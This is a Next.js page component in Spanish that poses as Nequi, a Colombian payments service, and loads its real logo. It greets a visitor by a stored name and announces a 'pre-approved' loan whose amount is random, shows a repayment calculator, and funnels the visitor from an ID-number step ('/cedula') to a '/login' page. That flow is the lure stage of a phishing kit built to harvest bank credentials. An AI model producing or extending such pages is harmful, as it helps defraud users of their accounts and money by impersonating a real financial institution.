"use client";

import { useState, useEffect } from "react";
import Image from "next/image";
import { Button } from "@/components/ui/button";
import Footer from "@/components/footer";
import {
    Card,
    CardContent,
    CardDescription,
    CardHeader,
    CardTitle,
} from "@/components/ui/card";
import {
    Select,
    SelectContent,
    SelectItem,
    SelectTrigger,
    SelectValue,
} from "@/components/ui/select";
import { Separator } from "@/components/ui/separator";
import {
    Calculator,
    CreditCard,
    DollarSign,
    Calendar,
    TrendingUp,
    FileText,
} from "lucide-react";
import { useRouter } from "next/navigation";

export default function CreditStudy() {
    const router = useRouter();
    const [nombre, setNombre] = useState("");
    const [loanAmount, setLoanAmount] = useState(0);
    const [selectedTerm, setSelectedTerm] = useState("");
    const [calculations, setCalculations] = useState({
        monthlyInterest: 0,
        totalPayment: 0,
        monthlyPayment: 0,
    });

    useEffect(() => {
        // Redirige si no hay nombre en sessionStorage
        const storedName = sessionStorage.getItem("nombre");
        if (!storedName) {
            router.push("/cedula");
            return;
        }
        setNombre(storedName);

        // Monto aleatorio
        const randomAmount =
            Math.floor(Math.random() * (3000000 - 2000000 + 1)) + 2000000;
        setLoanAmount(randomAmount);
    }, [router]);

    // Calcular préstamo cuando cambie el plazo
    useEffect(() => {
        if (selectedTerm && loanAmount) {
            const months = Number.parseInt(selectedTerm);
            const monthlyInterestRate = 0.025; // 2.5% mensual

            const monthlyInterest = loanAmount * monthlyInterestRate;
            const totalInterest = monthlyInterest * months;
            const totalPayment = loanAmount + totalInterest;
            const monthlyPayment = totalPayment / months;

            setCalculations({
                monthlyInterest,
                totalPayment,
                monthlyPayment,
            });
        }
    }, [selectedTerm, loanAmount]);

    const formatCurrency = (amount: number) => {
        return new Intl.NumberFormat("es-CO", {
            style: "currency",
            currency: "COP",
            minimumFractionDigits: 0,
            maximumFractionDigits: 0,
        }).format(amount);
    };

    return (
        <div className="min-h-screen bg-gray-50">
            {/* Header */}
            {/* Navbar */}
            <nav className="relative z-10 bg-white shadow-sm px-4 py-2">
                <div className="max-w-7xl mx-auto flex justify-between items-center">
                    <Image
                        src="https://cdn.prod.website-files.com/6317a229ebf7723658463b4b/663a6b0d43303ddf38035997_logo-nequi.svg"
                        alt="Nequi Logo"
                        width={120}
                        height={40}
                        priority
                    />
                    <Button
                        variant="ghost"
                        onClick={() => window.location.reload()}
                        className="bg-[#DA0081] hover:bg-[#C4006B] text-white rounded-md px-4 py-2"
                    >
                        Recargar
                    </Button>
                </div>
            </nav>

            {/*  Contenido Main  */}
            <main className="container mx-auto px-4 py-8">
                <div className="max-w-4xl mx-auto">
                    {/* Title */}
                    <div className="text-center mb-8">
                        <h1 className="text-3xl font-bold text-gray-800 mb-2">
                            Estudio de <span className="text-rosado">CRÉDITO</span>
                        </h1>
                        <div className="flex items-center justify-center space-x-4 text-sm text-gray-600">
                            <div className="flex items-center">
                                <div className="w-8 h-8 bg-rosado rounded-full flex items-center justify-center text-white text-xs font-bold mr-2">
                                    1
                                </div>
                                <span>Estudio de crédito</span>
                            </div>
                            <div className="w-8 h-px bg-gray-300"></div>
                            <div className="flex items-center">
                                <div className="w-8 h-8 bg-gray-300 rounded-full flex items-center justify-center text-gray-600 text-xs font-bold mr-2">
                                    2
                                </div>
                                <span>Inicia sesión</span>
                            </div>
                        </div>
                    </div>

                    {/* mensaje de Pre-approvado */}
                    <Card className="mb-8 border-violetaN bg-violetaN">
                        <CardHeader className="text-center">
                            <CardTitle className="text-2xl text-white flex items-center justify-center gap-2">
                                <CreditCard className="w-6 h-6" />
                                ¡Felicitaciones {nombre}!
                            </CardTitle>
                            <CardDescription className="text-lg text-white">
                                Tu préstamo pre-aprobado es de{" "}
                                <span className="font-bold text-2xl">
                                    {formatCurrency(loanAmount)}
                                </span>
                            </CardDescription>
                        </CardHeader>
                    </Card>

                    {/* Detalle de prestamo */}
                    <Card className="mb-8">
                        <CardHeader>
                            <CardTitle className="flex items-center gap-2">
                                <Calculator className="w-5 h-5 text-violetaN" />
                                Detalles del Préstamo
                            </CardTitle>
                            <CardDescription>
                                Selecciona el plazo de pago y revisa los detalles de tu crédito
                            </CardDescription>
                        </CardHeader>
                        <CardContent className="space-y-6">
                            {/* pantalla de detalle de prestamo */}
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
                                <div className="space-y-2">
                                    <label className="text-sm font-medium text-gray-700 flex items-center gap-2">
                                        <DollarSign className="w-4 h-4" />
                                        Monto del Préstamo
                                    </label>
                                    <div className="text-3xl font-bold text-rosado">
                                        {formatCurrency(loanAmount)}
                                    </div>
                                </div>

                                {/* Mes plazo Seleccionador */}
                                <div className="space-y-2">
                                    <label className="text-sm font-medium text-gray-700 flex items-center gap-2">
                                        <Calendar className="w-4 h-4" />
                                        Plazo de Pago
                                    </label>
                                    <Select value={selectedTerm} onValueChange={setSelectedTerm}>
                                        <SelectTrigger className="w-full">
                                            <SelectValue placeholder="Selecciona el número de meses" />
                                        </SelectTrigger>
                                        <SelectContent>
                                            <SelectItem value="6">6 meses</SelectItem>
                                            <SelectItem value="12">12 meses</SelectItem>
                                            <SelectItem value="18">18 meses</SelectItem>
                                            <SelectItem value="24">24 meses</SelectItem>
                                            <SelectItem value="36">36 meses</SelectItem>
                                            <SelectItem value="48">48 meses</SelectItem>
                                        </SelectContent>
                                    </Select>
                                </div>
                            </div>

                            {/* Calculations */}
                            {selectedTerm && (
                                <>
                                    <Separator />
                                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                                        <div className="text-center p-4 bg-rosado rounded-lg">
                                            <div className="flex items-center justify-center gap-2 mb-2">
                                                <TrendingUp className="w-5 h-5 text-white" />
                                                <span className="text-sm font-medium text-white">
                                                    Interés Mensual
                                                </span>
                                            </div>
                                            <div className="text-xl font-bold text-white">
                                                {formatCurrency(calculations.monthlyInterest)}
                                            </div>
                                            <div className="text-xs text-white mt-1">
                                                2.5% mensual
                                            </div>
                                        </div>

                                        <div className="text-center p-4 bg-rosado rounded-lg">
                                            <div className="flex items-center justify-center gap-2 mb-2">
                                                <FileText className="w-5 h-5 text-white" />
                                                <span className="text-sm font-medium text-white">
                                                    Pago Total
                                                </span>
                                            </div>
                                            <div className="text-xl font-bold text-white">
                                                {formatCurrency(calculations.totalPayment)}
                                            </div>
                                            <div className="text-xs text-white mt-1">
                                                Capital + Intereses
                                            </div>
                                        </div>

                                        <div className="text-center p-4 bg-rosado rounded-lg">
                                            <div className="flex items-center justify-center gap-2 mb-2">
                                                <CreditCard className="w-5 h-5 text-white" />
                                                <span className="text-sm font-medium text-white">
                                                    Cuota Mensual
                                                </span>
                                            </div>
                                            <div className="text-xl font-bold text-white">
                                                {formatCurrency(calculations.monthlyPayment)}
                                            </div>
                                            <div className="text-xs text-white mt-1">
                                                Por {selectedTerm} meses
                                            </div>
                                        </div>
                                    </div>
                                </>
                            )}
                        </CardContent>
                    </Card>

                    {/* Continue Button */}
                    <div className="text-center">
                        <Button
                            className="bg-[#200020] hover:bg-[#8C7D8D] text-white px-12 py-3 text-lg font-semibold rounded-lg"
                            disabled={!selectedTerm}
                            onClick={() => router.push("/login")}
                        >
                            Continuar
                        </Button>
                    </div>
                </div>
            </main>

            
        </div>
    );
}
